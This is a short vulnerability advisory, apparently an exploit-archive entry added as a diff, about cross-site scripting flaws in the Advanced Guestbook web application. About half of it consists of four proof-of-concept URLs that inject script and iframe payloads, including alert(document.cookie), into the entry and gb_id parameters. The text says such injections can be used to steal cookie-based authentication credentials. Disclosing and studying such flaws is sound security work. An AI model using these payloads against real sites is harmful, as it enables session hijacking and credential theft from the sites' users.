@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/15927/info
+
+Advanced Guestbook is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/guestbook/index.php?entry=<script>alert(document.cookie);</script>
+http://www.example.com/guestbook/index.php?entry=<iframesrc=http://www.example.com/>
+
+http://www.example.com/guestbook/comment.php?gb_id=1<script>alert(document.cookie);</script>
+http://www.example.com/guestbook/comment.php?gb_id=1<IFRAMESRC="javascript:alert('XSS');"></IFRAME> 
